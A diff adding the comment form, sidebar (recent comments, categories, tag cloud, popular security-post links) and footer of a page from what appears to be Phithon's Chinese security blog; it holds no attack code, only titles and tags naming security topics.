+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="9e36b3129ea0ed2f7d0d3f1a60f9eb5ec4c696c2" />
+</div><div class="col-6">
+<img src="../captcha/image/9e36b3129ea0ed2f7d0d3f1a60f9eb5ec4c696c2/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="425" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="zkkJ8EGD2BMloCWTbhu3t4TbZXVAAGQZlSIAGJhmqX04WaKhdirOqxWgkkcL9i2h">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+        
+        <a rel="tag" href="../tag/iOS.html">iOS</a>
+        
+        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
+        
+        <a rel="tag" href="../tag/%E6%A1%A5%E6%8E%A5.html">桥接</a>
+        
+        <a rel="tag" href="../tag/writeup.html">writeup</a>
+        
+        <a rel="tag" href="../tag/IIS.html">IIS</a>
+        
+        <a rel="tag" href="../tag/WTForm.html">WTForm</a>
+        
+        <a rel="tag" href="../tag/apache.html">apache</a>
+        
+        <a rel="tag" href="../tag/web%E6%8C%87%E7%BA%B9.html">web指纹</a>
+        
+        <a rel="tag" href="../tag/%E6%B1%89%E8%AF%BA%E5%A1%94.html">汉诺塔</a>
+        
+        <a rel="tag" href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+        
+        <a rel="tag" href="../tag/Linux.html">Linux</a>
+        
+        <a rel="tag" href="../tag/CSP.html">CSP</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
+        
+        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
+        
+        <a rel="tag" href="../tag/%E6%80%BB%E7%BB%93.html">总结</a>
+        
+        <a rel="tag" href="../tag/%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95.html">遍历目录</a>
+        
+        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
+        
+        <a rel="tag" href="../tag/var_dump.html">var_dump</a>
+        
+        <a rel="tag" href="../tag/disable_functions.html">disable_functions</a>
+        
+        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/web%E5%BA%94%E7%94%A8.html">web应用</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/asyncore.html">asyncore</a>
+        
+        <a rel="tag" href="../tag/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87.html">沙盒绕过</a>
+        
+        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
+        
+        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E5%BA%A6.html">数据库速度</a>
+        
+        <a rel="tag" href="../tag/kali.html">kali</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
